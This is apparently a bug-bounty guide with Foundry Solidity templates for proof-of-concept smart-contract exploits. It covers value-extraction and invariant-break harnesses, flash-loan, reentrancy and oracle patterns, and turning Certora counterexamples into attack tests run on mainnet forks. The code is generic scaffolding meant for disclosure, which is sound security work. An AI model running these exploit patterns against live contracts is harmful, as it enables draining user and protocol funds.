# Practical PoC Template for Vulnerability Demonstration

**Quick Guide for You:**

If you're writing your own PoC:

1. Scroll to "Template 1" or "Template 2" sections
2. Copy the entire template code
3. Find these lines and replace them:

```solidity
import {VulnerableContract} from "src/VulnerableContract.sol"; // Change this
target.vulnerableFunction(); // Change this to your exploit
```
4. Run the test

**If asking AI (like me) to write it:**

1. Tell me: "I found a bug in Vault.sol where withdraw() doesn't check balances"
2. Tell me: "Use Template 1 from POC_TEMPLATE.md"
3. I'll generate the complete working code
4. You just review and run it

## How to Use This Template

**Start here:** Do you want to write the PoC yourself or have AI help you?

---

### Option 1: Write PoC Yourself (Recommended for Learning)

**Steps:**
1. Scroll down to **"Quick Decision"** section
2. Answer: "Does the attacker extract value?" → Choose Template 1 or 2
3. Copy the chosen template code
4. Replace the placeholder parts:
   - `VulnerableContract` → Your actual contract name
   - `testExploit()` → Your actual attack steps
   - `address constant MAINNET_VAULT = 0x...` → Real addresses
5. Run: `forge test --match-test testExploit -vvv`

**Example of what to replace:**
```solidity
// Template says:
target.vulnerableFunction();

// You write:
target.withdraw(type(uint256).max); // Your actual exploit
```

---

### Option 2: Have AI Write PoC for You

**When to use:** You have the vulnerability analysis ready but want AI to generate the code.

**Steps:**
1. First, write down your vulnerability details (see format below)
2. Copy that analysis + one of the templates below
3. Ask AI: "Generate a PoC using this template and vulnerability details"
4. Review and test the generated code

**Format your vulnerability analysis like this:**

```
I found a vulnerability in [Contract]:

CONTRACT: contracts/Vault.sol
FUNCTION: withdraw(uint256 amount)
ROOT CAUSE: Missing balance check allows withdrawal of more than deposited
IMPACT: Attacker can drain vault funds
ATTACK STEPS:
  1. Deposit 100 tokens
  2. Call withdraw(1000 tokens) - doesn't revert
  3. Attacker receives 1000 tokens, vault loses 900

TEMPLATE TO USE: Template 1 (Value Extraction)
```

**Then ask AI:**
```
Generate a practical Foundry PoC for this vulnerability using Template 1.

[Paste your vulnerability analysis above]

Requirements:
- Fork mainnet at block 19500000
- Attacker starts with 1000 tokens from whale
- Demonstrate the 900 token profit
```

**Important:** Always review AI-generated code for:
- Correct import paths
- Realistic values
- No `vm.store()` on target contract
- Proper assertions

---

## Using This Template with Certora Findings

When Certora finds a real bug and you want to write a PoC to demonstrate it:

### Step 1: Analyze the Counterexample

From the Certora output, extract:
- **Rule that failed:** Which invariant/rule was violated?
- **Call trace:** What sequence of functions led to the violation?
- **State that broke:** What values changed incorrectly?
- **Arguments used:** What inputs triggered the bug?

### Step 2: Translate to Vulnerability Description

```
CERTORA FINDING:
Rule: [invariant_name or rule_name]
Contract: [Contract.sol]
Function: [vulnerableFunction]
Violation: [What invariant was broken]

ROOT CAUSE:
[Extract from call trace - what code path executed incorrectly]

IMPACT:
[What does this violation mean in real terms - theft, DoS, insolvency?]
```

### Step 3: Choose PoC Template

- If Certora shows balance/supply violation → Use **Template 1 (Value Extraction)**

---

## Converting Anti-Invariant CEs to Exploit PoCs (v3.0)

When an **offensive verification anti-invariant** (from `impact-spec-template.md`) produces a counterexample, the CE contains concrete exploit parameters. This section maps each anti-invariant to a PoC structure.

### Anti-Invariant CE → PoC Mapping

| Anti-Invariant Rule | CE Contains | PoC Template | Key Assertion |
|---------------------|-------------|--------------|---------------|
| `attacker_cannot_profit` | Function, args, `actor_value` before/after | Template 1 (Value Extraction) | `assertGt(profit, 0)` |
| `system_value_conserved` | Function, args, `total_system_value` delta | Template 1 (Value Extraction) | `assertLt(vaultAfter, vaultBefore)` |
| `zero_sum_transfers` | Two addresses, value changes, net imbalance | Template 1 (Value Extraction) | `assertGt(callerDelta + otherDelta + systemDelta, 0)` |
| `flash_loan_attack_search` | 3 envs, function, borrow amount, profit | Template 1 + flash loan pattern | `assertGt(profit, flashLoanFee)` |
| `sandwich_attack_search` | 3 txs, attacker/victim addresses, profit/loss | Template 1 + multi-tx pattern | `assertGt(attackerProfit, 0)` |
| `staged_attack_accumulation` | 3 envs across blocks, phase deltas, total profit | Template 1 + multi-tx pattern | `assertGt(totalProfit, 0)` |

### Step-by-Step: `attacker_cannot_profit` CE → Foundry PoC

This is the most common anti-invariant to produce actionable CEs.

**1. Extract from CE call trace:**

```
CE Output:
  Rule: attacker_cannot_profit
  Status: VIOLATED
  
  Environment:
    e.msg.sender = 0x1234...  (attacker)
    e.msg.value  = 0
    e.block.number = 19500000
  
  Function called: withdraw(uint256)
  Arguments: [2000000000000000000000]  (2000 * 10^18)
  
  Ghost values:
    actor_value[0x1234...] BEFORE = 1000000000000000000000  (1000 * 10^18)
    actor_value[0x1234...] AFTER  = 3000000000000000000000  (3000 * 10^18)
  
  Profit = 2000 * 10^18
```

**2. Translate to Foundry PoC:**

```solidity
function testExploit_attacker_cannot_profit() external {
    // Setup: replicate CE initial state
    address attacker = makeAddr("attacker");
    deal(address(token), attacker, 1000e18);  // CE initial balance

    vm.startPrank(attacker);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1000e18);  // Establish position

    // Snapshot before exploit
    uint256 balanceBefore = token.balanceOf(attacker);

    // Execute: replicate CE function call with CE arguments
    vault.withdraw(2000e18);  // CE argument: 2000 * 10^18

    vm.stopPrank();

    // Assert: replicate CE profit
    uint256 balanceAfter = token.balanceOf(attacker);
    uint256 profit = balanceAfter - balanceBefore;

    console2.log("Profit:", profit / 1e18, "tokens");
    assertGt(profit, 0, "Exploit: attacker profited");
}
```

**3. If PoC fails on fork:**

| PoC Failure | Root Cause | Fix |
|-------------|-----------|-----|
| Reverts at withdraw | CE used over-approximate state | Check if CE requires specific storage setup |
| Profit is 0 | Hooks were incomplete (capture different token) | Verify hook liveness passed for this function |
| Different profit amount | CE used `mathint` (no overflow); Solidity uses `uint256` | Check for overflow at boundary values |
| Gas exceeds block limit | CE doesn't model gas | Measure gas; check if attack is economical |

### Step-by-Step: Multi-Step CE → Foundry PoC

For `flash_loan_attack_search` or `sandwich_attack_search` CEs:

```solidity
// NOTE: In a flash loan attack, the TEST CONTRACT itself is the attacker.
// Do NOT use vm.startPrank() — the callback comes to address(this),
// and tokens land in address(this). Let the test contract act directly.

function testExploit_flash_loan_attack() external {
    uint256 balanceBefore = token.balanceOf(address(this));

    // Step 1: Flash loan (from CE e_borrow)
    // The test contract IS the borrower — no prank needed
    flashLoanProvider.flashLoan(
        address(this),       // borrower = this contract
        address(token),
        1000000e18,          // CE: borrow_amount
        ""                   // data passed to callback
    );

    // Verify profit after flash loan fully repaid
    uint256 profit = token.balanceOf(address(this)) - balanceBefore;
    console2.log("Flash loan profit:", profit);
    assertGt(profit, 0, "Flash loan attack profitable");
}

// Flash loan callback — called by the flash loan provider on address(this)
function onFlashLoan(
    address initiator,
    address tkn,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external returns (bytes32) {
    require(initiator == address(this), "Unexpected initiator");

    // Step 2: CE attack function with CE args
    IERC20(tkn).approve(address(vault), type(uint256).max);
    vault.deposit(amount);
    vault.withdraw(amount * 2);  // CE argument

    // Step 3: Repay flash loan + fee
    IERC20(tkn).approve(msg.sender, amount + fee);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### `satisfy` Witness → Foundry PoC

When `find_profitable_inputs` returns SAT, the **witness** (not counterexample) contains exploit parameters:

| CE vs Witness | Source | Meaning |
|---------------|--------|---------|
| **Counterexample** (from `assert`) | Rule VIOLATED | Proof of bug — concrete values that break the property |
| **Witness** (from `satisfy`) | Rule SAT | Existence proof — concrete values that satisfy the condition |

Both contain the same fields (env, function, args, ghost values). The PoC conversion process is identical.

- If Certora shows access control bypass → Use **Template 2 (Invariant Break)**

### Step 4: Map Call Trace to PoC

Take the Certora call trace and convert to Foundry test. For example,

```solidity
// Certora found: deposit(1000) → withdraw(2000) → VIOLATION

function testFinding() public {
    vm.startPrank(attacker);
    
    // Replicate exact sequence from Certora
    target.deposit(1000e18);
    target.withdraw(2000e18); // Should fail but doesn't
    
    vm.stopPrank();
    
    // Verify the violation Certora found
    assertGt(token.balanceOf(attacker), 1000e18, "Attacker withdrew more than deposited");
}
```

### Example: Complete Workflow

```
1. Certora reports: "invariant_solvency VIOLATED"
   Call trace: user deposits 100 tokens → price manipulated → withdraws 200 tokens

2. You analyze: This is an oracle manipulation leading to value extraction

3. You choose: Template 1 (Value Extraction)

4. You write PoC:
   - setUp(): Fork mainnet, get oracle address
   - testExploit(): 
     a. Deposit 100 tokens
     b. Manipulate oracle price (if possible externally)
     c. Withdraw based on manipulated price
     d. Assert profit > 0

5. You run: forge test --match-test testExploit -vvv

6. Result: PoC confirms Certora finding is exploitable on-chain
```

---

## Quick Decision: What Type of Bug?

Before writing code, walk through this decision tree:

```
1. Does the attacker extract value (tokens/ETH)?
   ├─ YES → Template 1 (Value Extraction)
   │   ├─ Direct theft (withdraw more than deposited)
   │   ├─ Price manipulation (oracle, AMM sandwich)
   │   ├─ Flash loan profit
   │   └─ Fee/reward abuse
   │
   └─ NO → Does the attacker cause permanent harm without extracting funds?
       ├─ YES → Template 2 (Invariant Break)
       │   ├─ Access control bypass (call admin/restricted functions)
       │   ├─ Forced liquidation of solvent positions
       │   ├─ Permanent DoS / griefing (freeze withdrawals, block upgrades)
       │   ├─ Fund locking (user cannot withdraw forever)
       │   ├─ State corruption (break storage invariants, poison oracles)
       │   └─ Governance hijack (pass unauthorized proposals)
       │
       └─ NO → Not a vulnerability (or needs stronger impact argument)
```

**Edge cases:**
- **Fund locking** (users can't withdraw): Use Template 2 — the invariant is "users can always withdraw their own funds." `_computeImpact()` returns the locked amount.
- **Cross-chain bugs**: Use Template 1 or 2 on the affected chain. Fork the chain where the exploit matters and demonstrate impact there.
- **DoS that costs the attacker money**: Use Template 1 if the victim's loss exceeds attacker's cost; otherwise Template 2 focused on the denial of service itself.
- **Governance manipulation**: Use Template 2. The invariant is the governance threshold / timelock / quorum that was bypassed.

---

## Template 1: Value Extraction PoC

Use this for fund extraction when the attacker steals/drains/mints tokens or ETH etc.

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {VulnerableContract} from "src/VulnerableContract.sol";
import {IERC20} from "src/interfaces/IERC20.sol";
// Add any additional imports your exploit requires:
// import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
// import {IPool} from "src/interfaces/IPool.sol";
/**
 * @title ExploitPoC
 *
 * @notice
 *  Demonstrating funds-extraction vulnerabilities
 *  in a way that is fully real without any false assumption.
 *
 *  Impact Requirement (paraphrased):
 *  ------------------------------------------------------------
 *  “The vulnerability must result in a direct loss of funds
 *   for users or the protocol, with a measurable economic impact.”
 *
 *  This enforces that requirement by:
 *   - Snapshotting attacker and victim balances pre-exploit
 *   - Executing the exploit
 *   - Asserting attacker profit > 0
 *   - Asserting victim loss > 0
 *
 *  If either condition fails, the PoC fails.
 */
contract ExploitTest is Test {
    /*//////////////////////////////////////////////////////////////
                                SETUP
    //////////////////////////////////////////////////////////////*/

    VulnerableContract public target;
    IERC20 public token;

    address public attacker;
    address public victim;

    address constant MAINNET_TOKEN = 0x...;
    address constant MAINNET_VAULT = 0x...;

    // Choose a block where the vulnerable state exists.
    // Find a block by timestamp: `cast find-block --timestamp <unix_ts> --rpc-url $RPC`
    // Or pick the latest stable block from a block explorer.
    uint256 constant FORK_BLOCK = 19_500_000;

    struct BalanceSnapshot {
        address token;           // Asset being tracked (ERC20, LP token, etc.)
        uint256 attackerBefore;  // Attacker balance before exploit
        uint256 victimBefore;    // Victim / protocol balance before exploit
    }

    BalanceSnapshot[] internal snapshots;

    // ETH tracking (for exploits that extract native ETH)
    bool internal ethSnapshotTaken;
    uint256 internal attackerEthBefore;
    uint256 internal victimEthBefore;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);

        target = VulnerableContract(MAINNET_VAULT);
        token = IERC20(MAINNET_TOKEN);

        attacker = makeAddr("attacker");

        // Set the victim to whoever actually loses funds in this exploit.
        // Common choices:
        //   address(target)          — the protocol vault / pool itself
        //   0xRealUserAddress         — a specific on-chain user (LP, depositor)
        //   makeAddr("victim")        — a generic user for local deployments
        //
        // For fork tests, pick the real address that holds the funds at risk.
        // For local deployments, deploy a victim position in setUp().
        victim = address(target);

        vm.deal(attacker, 10 ether);

        // Seed ONLY the capital required to trigger the exploit.
        // Prefer deal() — it works for all ERC20s including fee-on-transfer,
        // rebasing, and blacklist tokens where whale transfers would fail.
        deal(address(token), attacker, 1_000e18);

        // Alternative: transfer from whale (only if deal() breaks the token's
        // internal accounting — e.g., tokens that track per-address state).
        // address whale = 0x...;
        // vm.prank(whale);
        // token.transfer(attacker, 1_000e18);

        vm.label(attacker, "Attacker");
        vm.label(address(target), "VulnerableVault");
        vm.label(address(token), "Token");
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 1 — SNAPSHOT
    //////////////////////////////////////////////////////////////*/
    /**
     * @notice Records pre-exploit balances.
     *
     * @dev
     *  This MUST be called after any seed funding required
     *  to trigger the exploit, and BEFORE exploit execution.
     *
     *  This ensures seed capital is not miscounted as profit.
     */
    function snapshotBalances(address _token) internal {
        // Guard against snapshotting the same token twice
        for (uint256 i = 0; i < snapshots.length; i++) {
            require(snapshots[i].token != _token, "Token already snapshotted");
        }

        snapshots.push(
            BalanceSnapshot({
                token: _token,
                attackerBefore: IERC20(_token).balanceOf(attacker),
                victimBefore: IERC20(_token).balanceOf(victim)
            })
        );
    }

    /**
     * @notice Records pre-exploit ETH balances.
     * @dev Use this when the exploit extracts native ETH (not WETH).
     */
    function snapshotETH() internal {
        ethSnapshotTaken = true;
        attackerEthBefore = attacker.balance;
        victimEthBefore = victim.balance;
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 2 — EXPLOIT
    //////////////////////////////////////////////////////////////*/

    function executeExploit() internal {
        require(snapshots.length > 0, "Snapshot not taken — call snapshotBalances() first");

        vm.startPrank(attacker);

        token.approve(address(target), type(uint256).max);

        // Step 1: Legitimate interaction
        target.deposit(1_000e18);

        // Step 2: Trigger vulnerability
        target.vulnerableFunction();

        // Step 3: Extract funds
        target.withdraw(target.balanceOf(attacker));

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 3 — ASSERTIONS
    //////////////////////////////////////////////////////////////*/

    function assertEconomicImpact() internal {
        bool hasProfit;
        bool victimHarmed;

        for (uint256 i = 0; i < snapshots.length; i++) {
            BalanceSnapshot memory s = snapshots[i];

            uint256 attackerAfter =
                IERC20(s.token).balanceOf(attacker);
            uint256 victimAfter =
                IERC20(s.token).balanceOf(victim);

            // Use signed arithmetic to avoid underflow revert when
            // attacker spends one token to gain another.
            int256 profit = int256(attackerAfter) - int256(s.attackerBefore);
            int256 loss   = int256(s.victimBefore) - int256(victimAfter);

            console2.log("\nToken:", s.token);
            console2.log("Attacker delta (wei):", profit >= 0 ? uint256(profit) : uint256(-profit));
            console2.log("Victim   delta (wei):", loss >= 0 ? uint256(loss) : uint256(-loss));

            if (profit > 0) hasProfit = true;
            if (loss > 0)   victimHarmed = true;
        }

        // ETH tracking
        if (ethSnapshotTaken) {
            int256 ethProfit = int256(attacker.balance) - int256(attackerEthBefore);
            int256 ethLoss   = int256(victimEthBefore) - int256(victim.balance);

            console2.log("\nETH:");
            console2.log("Attacker ETH delta (wei):", ethProfit >= 0 ? uint256(ethProfit) : uint256(-ethProfit));
            console2.log("Victim   ETH delta (wei):", ethLoss >= 0 ? uint256(ethLoss) : uint256(-ethLoss));

            if (ethProfit > 0) hasProfit = true;
            if (ethLoss > 0)   victimHarmed = true;
        }

        require(hasProfit, "PoC: attacker did not profit");
        require(victimHarmed, "PoC: victim did not lose funds");
    }

    /*//////////////////////////////////////////////////////////////
                            TEST ENTRY
    //////////////////////////////////////////////////////////////*/

    function testExploit() external {
        snapshotBalances(address(token));
        executeExploit();
        assertEconomicImpact();
    }
}
```

### What to Customize

1. **Imports** - Add your actual contract imports
2. **setUp()** - Choose fork or local deployment
3. **Initial tokens** - Get tokens via whale or protocol functions
4. **testExploit()** - Replace with your actual attack steps
5. **Assertions** - Verify the specific impact you're demonstrating

---

## Template 2: Invariant Break PoC (No Value Transfer)

Use this when the attacker triggers unauthorized execution but doesn't extract value directly.

Examples:
- Liquidating a solvent position
- Bypassing access control
- Breaking a safety check
- Permanent DoS or griefing

### `InvariantBreakHarness.sol` — Required Base Contract

Create this file alongside your test. Template 2 inherits from it.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

/**
 * @title InvariantBreakHarness
 *
 * @notice Base contract for PoCs that demonstrate unauthorized-execution
 *         bugs (access control bypass, broken safety checks, griefing, DoS).
 *
 *  Child contracts override three hooks:
 *    1. _invariantHolds()            — define the property that MUST be true
 *    2. _executeUnauthorizedAction() — the action that should be impossible
 *    3. _computeImpact()             — measure the downstream damage
 *
 *  Call _assertInvariantBreak() in the test entry point.
 *  The harness will:
 *    a. Verify the invariant holds BEFORE the attack
 *    b. Execute the unauthorized action as the attacker
 *    c. Verify the invariant is BROKEN after the action
 *    d. Measure and log the impact
 */
abstract contract InvariantBreakHarness is Test {
    address public attacker;
    address public victim;

    // ── Hooks — override in child ────────────────────────────

    /// @dev Return true when the protocol invariant is intact.
    function _invariantHolds() internal view virtual returns (bool);

    /// @dev Execute the action that should be impossible.
    function _executeUnauthorizedAction() internal virtual;

    /// @dev Quantify downstream damage (e.g., liquidation penalty, lost funds).
    ///      Return 0 if the impact is non-monetary (pure DoS).
    function _computeImpact() internal view virtual returns (uint256);

    // ── Orchestration ────────────────────────────────────────

    function _assertInvariantBreak() internal {
        // 1. Pre-condition: invariant MUST hold before the attack
        bool holdsBefore = _invariantHolds();
        assertTrue(holdsBefore, "Pre-condition failed: invariant already broken before attack");

        console2.log("\n=== INVARIANT BREAK PoC ===");
        console2.log("Invariant holds BEFORE attack: true");

        // 2. Execute the unauthorized action as the attacker
        vm.startPrank(attacker);
        _executeUnauthorizedAction();
        vm.stopPrank();

        // 3. Post-condition: invariant MUST be broken now
        bool holdsAfter = _invariantHolds();
        console2.log("Invariant holds AFTER  attack:", holdsAfter ? "true (BUG NOT TRIGGERED)" : "FALSE — BROKEN");

        assertFalse(holdsAfter, "Invariant was NOT broken — unauthorized action had no effect");

        // 4. Measure impact
        uint256 impact = _computeImpact();
        console2.log("Impact (wei):", impact);

        if (impact > 0) {
            console2.log("Impact (ETH-scale):", impact / 1e18);
        } else {
            console2.log("Impact is non-monetary (DoS / state corruption)");
        }

        console2.log("=== END ===\n");
    }
}
```

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {VulnerableContract} from "src/VulnerableContract.sol";
import {InvariantBreakHarness} from "./InvariantBreakHarness.sol";

contract InvalidLiquidationTest is InvariantBreakHarness {
    VulnerableContract public target;

    // ── CHOOSE ONE setUp() and delete the other ──────────────

    // Option A: Local PoC (fresh deployment)
    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        target = new VulnerableContract();

        // Victim enters a protected / safe state
        vm.prank(victim);
        target.createSafePosition();

        vm.deal(attacker, 1 ether);

        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");
        vm.label(address(target), "VulnerableProtocol");
    }

    /*
    // Option B: Mainnet PoC (fork) — uncomment this and DELETE Option A above
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19_500_000);

        attacker = makeAddr("attacker");
        victim = 0xREAL_USER;

        target = VulnerableContract(0xDEPLOYED_ADDRESS);

        require(target.isSolvent(victim), "Victim not solvent");
    }
    */

    /*//////////////////////////////////////////////////////////////
                        INVARIANT DEFINITION
    //////////////////////////////////////////////////////////////*/

    /**
     * INVARIANT:
     *  Solvent positions MUST NOT be liquidatable.
     */
    function _invariantHolds() internal view override returns (bool) {
        return target.isSolvent(victim);
    }

    /*//////////////////////////////////////////////////////////////
                    UNAUTHORIZED ACTION
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev
     *  This call should be impossible while the invariant holds.
     *  Its success proves unauthorized execution.
     */
    function _executeUnauthorizedAction() internal override {
        target.liquidate(victim);
    }

    /*//////////////////////////////////////////////////////////////
                        DOWNSTREAM IMPACT
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev
     *  Liquidation of a solvent position causes forced penalty / loss.
     *  This satisfies Immunefi’s impact requirement even if
     *  the attacker does not receive funds directly.
     */
    function _computeImpact() internal view override returns (uint256) {
        return target.calculateLiquidationPenalty(victim);
    }

    /*//////////////////////////////////////////////////////////////
                            TEST ENTRY
    //////////////////////////////////////////////////////////////*/

    function testInvalidLiquidation() external {
        _assertInvariantBreak();
    }
}
```

### When to Use This Template

Use **Invariant Break** template when:
- The bug allows calling a protected function
- Execution reaches unauthorized code paths
- A safety check is bypassed
- The impact is griefing/DoS/breaking protocol state

**Important:** You still need to show **real harm**:
- Show what function executed that shouldn't have
- Show the victim's loss or protocol damage
- Show why this matters economically
- Proves unauthorized execution + concrete harm

| Dimension                    | Refactored              |
| ---------------------------- | ----------------------- |
| Invariant formalization      | **Explicit & enforced** |
| Unauthorized execution proof | **Structural**          |
| Impact requirement           | **Mandatory**           |
| Reusability                  | **High**                |
| Judge clarity                | **Very High**           |
---

## Common Patterns & Helpers

### Pattern 1: Get Tokens from Whale

```solidity
function fundAttackerFromWhale(address token, uint256 amount) internal {
    // Find whale on Etherscan (holder with largest balance)
    address whale = 0x...; // Top holder address
    
    uint256 whaleBalance = IERC20(token).balanceOf(whale);
    require(whaleBalance >= amount, "Whale insufficient");
    
    vm.prank(whale);
    IERC20(token).transfer(attacker, amount);
}
```

### Pattern 2: Measure Gas Cost

**Modern approach — `vm.startSnapshotGas` / `vm.stopSnapshotGas` (preferred):**

```solidity
function testExploitWithGasTracking() public {
    // Exclude setUp / seed logic from measurement
    vm.pauseGasMetering();
    _seedAttacker();
    vm.resumeGasMetering();

    // Named gas snapshot — only measures the exploit itself
    vm.startSnapshotGas("exploit");

    vm.prank(attacker);
    target.exploit();

    uint256 gasUsed = vm.stopSnapshotGas();
    uint256 costWei = gasUsed * 50 gwei;

    console2.log("Gas used:", gasUsed);
    console2.log("Gas cost (wei, at 50 gwei):", costWei);
    console2.log("Gas cost (gwei):", costWei / 1 gwei);
}
```

**Legacy approach — `gasleft()` (works everywhere):**

```solidity
function testExploitWithGasTracking_legacy() public {
    uint256 gasBefore = gasleft();

    vm.prank(attacker);
    target.exploit();

    uint256 gasUsed = gasBefore - gasleft();
    console2.log("Gas used:", gasUsed);
}
```

### Pattern 3: Time-Based Exploits

```solidity
function testExploitRequiresTimeDelay() public {
    // Setup vulnerable state
    vm.prank(attacker);
    target.setupAttack();
    
    // Wait for condition
    vm.warp(block.timestamp + 1 days);
    
    // Execute
    vm.prank(attacker);
    target.executeAttack();
    
    // Verify
    assertGt(token.balanceOf(attacker), 0);
}
```

### Pattern 4: Reentrancy Attack

Reentrancy requires a callback contract. The test contract itself can serve as the attacker:

```solidity
contract ReentrancyExploitTest is Test {
    VulnerableContract target;
    IERC20 token;
    uint256 reentrancyCount;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
        target = VulnerableContract(MAINNET_VAULT);
        token = IERC20(MAINNET_TOKEN);

        // The test contract IS the attacker
        deal(address(token), address(this), 1e18);
        token.approve(address(target), type(uint256).max);
        target.deposit(1e18);

        vm.label(address(target), "VulnerableVault");
        vm.label(address(token), "Token");
    }

    function testReentrancy() public {
        uint256 vaultBefore = token.balanceOf(address(target));

        // Trigger the vulnerable withdraw — this calls back into receive()/fallback()
        target.withdraw(1e18);

        uint256 vaultAfter = token.balanceOf(address(target));
        console2.log("Vault drained:", vaultBefore - vaultAfter);
        console2.log("Attacker gained:", token.balanceOf(address(this)));
        assertGt(token.balanceOf(address(this)), 1e18, "Reentrancy: extracted more than deposited");
    }

    // Callback — the reentrancy entry point
    receive() external payable {
        if (reentrancyCount < 5 && address(target).balance > 0) {
            reentrancyCount++;
            target.withdraw(1e18);
        }
    }

    // For ERC-777 / ERC-1155 token callbacks, override the relevant hook:
    // function tokensReceived(...) external { target.withdraw(...); }
    // function onERC1155Received(...) external returns (bytes4) { target.withdraw(...); }
}
```

### Pattern 5: Multi-Transaction Attack

```solidity
function testMultiTxExploit() public {
    // Transaction 1: Setup
    vm.prank(attacker);
    target.txStep1();
    
    // Simulate block advancement — advance BOTH block number AND timestamp.
    // Many protocols use block.timestamp for logic (timelocks, interest, oracles).
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 12);  // ~12s per block on mainnet
    
    // Transaction 2: Exploit
    vm.prank(attacker);
    target.txStep2();
    
    // Transaction 3: Extract
    vm.prank(attacker);
    target.txStep3();
    
    // Verify final state
    assertGt(token.balanceOf(attacker), initialBalance);
}
```

### Pattern 6: Asserting That a Call Should Revert (But Doesn't)

For invariant-break PoCs, you often need to prove that a call **should** revert but is missing its guard:

```solidity
function testMissingAccessControl() public {
    // This call should revert for unauthorized callers — but it doesn't
    vm.prank(attacker);
    // vm.expectRevert();  ← If this were here and the call reverted, the test passes.
    //                       We OMIT it to show the call SUCCEEDS when it shouldn't.
    target.adminFunction();  // Should revert but doesn't → access control bug

    // Prove the unauthorized state change happened
    assertTrue(target.adminActionWasExecuted(), "Unauthorized admin action succeeded");
}

function testShouldRevertButDoesNot() public {
    // Approach: use try/catch to prove the call succeeds
    vm.prank(attacker);
    try target.restrictedFunction() {
        // If we reach here, the call did not revert — BUG
        emit log("BUG: restrictedFunction() did not revert for unauthorized caller");
    } catch {
        fail("Call reverted as expected — no bug");
    }
}
```

---

## Rules for Realistic PoCs

### ✅ DO:

1. **Start from real state** - Fork mainnet or deploy fresh
2. **Use public functions** - Only call what any user can call
3. **Show the profit** - Actual token/ETH numbers
4. **Keep it minimal** - Shortest path to demonstrate the bug
5. **Console.log key steps** - Help reviewers understand the flow

### ❌ DON'T:

1. **Don't use `vm.store()` on target contract** - Can't change deployed contract storage
2. **Don't use `vm.mockCall()` on in-scope contracts** - Mocking target contract behavior makes the PoC unrealistic
3. **Don't give attacker special powers** - No admin roles, no direct storage writes
4. **Don't skip critical steps** - If exploit needs setup, show it
5. **Don't use unrealistic amounts** - Keep token amounts reasonable
6. **Don't over-comment** - Code should be self-explanatory

### Special Case: When `vm.store()` Is OK

`vm.store()` is acceptable **only on out-of-scope / external dependency contracts** — never on the contract you are proving is vulnerable. If you store on the target, a judge can dismiss the PoC as fabricated state.

**Allowed uses:**
- Setting state on an **oracle** or **price feed** to model a historical price
- Setting state on an **external dependency** (another protocol's vault, a timelock) that could have reached that state through normal usage
- Setting a **non-target** contract's storage to recreate conditions that existed at a past block

**Never allowed:**
- `vm.store(address(target), ...)` — this is the contract under audit; manipulating its storage invalidates the PoC
- Storing balances or approvals that bypass the target's own logic

```solidity
// ✅ ACCEPTABLE: Set state on an OUT-OF-SCOPE oracle to model a past price
function testStaleOracleExploit() public {
    // The oracle is external / out of scope — its state is a precondition.
    // This price was observed on-chain 30 days ago.
    address oracle = 0x...; // External price feed, NOT the target
    uint256 stalePrice = 1500e8;

    vm.store(
        oracle,              // ← NOT address(target)
        bytes32(uint256(0)), // price slot
        bytes32(stalePrice)
    );

    // Now show the bug: the TARGET doesn't revalidate the stale oracle
    vm.prank(attacker);
    target.borrow(1_000e18); // Under-collateralised because price is stale

    assertGt(token.balanceOf(attacker), 0, "Borrowed with stale oracle data");
}

// ❌ NEVER: vm.store on the TARGET contract itself
// vm.store(address(target), ...) — INVALIDATES the PoC
```

> **Tip:** Prefer forking at a block where the precondition already exists
> naturally, so you don't need `vm.store()` at all. Use
> `cast find-block --timestamp <unix_ts>` to find the right block.

---

## Running Your PoC

> **Fork URL note:** If your `setUp()` already calls `vm.createSelectFork()`,
> you do **not** need `--fork-url` on the command line — it would create a
> redundant second fork that the test ignores. Only pass `--fork-url` when
> your test does NOT set up its own fork.

### Verbosity Levels

Choose the right trace depth for your situation:

| Flag | Output | When to Use |
|------|--------|-------------|
| (none) | Pass/fail summary only | CI, quick sanity check |
| `-v` | Test names | Scanning which tests ran |
| `-vv` | `console2.log` output visible | Verifying your logging shows profit/loss |
| `-vvv` | Traces for **failing** tests | **First stop for debugging a revert** |
| `-vvvv` | Traces for **all** tests, including setUp | Verifying call order in passing PoCs |
| `-vvvvv` | Traces **+ storage changes** | Inspecting state mutations, slot values |

### Basic Run

```bash
# Local deployment (no fork in setUp)
forge test --match-test testExploit -vvv

# Mainnet fork via CLI (only if setUp does NOT call createSelectFork)
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvv

# If setUp already calls vm.createSelectFork — just run:
forge test --match-test testExploit -vvv
```

### With Gas Report

```bash
forge test --match-test testExploit --gas-report -vvv
```

To report only specific contracts (reduce noise), add to `foundry.toml`:

```toml
[profile.default]
gas_reports = ["VulnerableContract"]
gas_reports_ignore = ["Test", "Script"]
```

### Debug Mode (Full Traces + Storage Changes)

```bash
# -vvvvv shows storage slot writes — essential for verifying state corruption
forge test --match-test testExploit -vvvvv
```

### Interactive Debugger

Step through opcodes to trace the exact exploit path:

```bash
forge test --debug testExploit
```

Debugger keys: `n` (next opcode), `s` (step into), `o` (step out), `c` (continue to breakpoint), `q` (quit).

### Specific Block (CLI fork only)

```bash
# Only needed when NOT using vm.createSelectFork in setUp
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --fork-block-number 19500000 -vvv
```

### Replay a Real On-Chain Transaction

When investigating a past exploit, replay the attacker's actual transaction to see the full trace:

```bash
# Replay and show full trace of a historical exploit tx
cast run 0x<txhash> --rpc-url $MAINNET_RPC_URL
```

This fetches the tx from chain, re-executes it locally, and shows the complete call tree — useful for reverse-engineering an exploit before writing your own PoC.
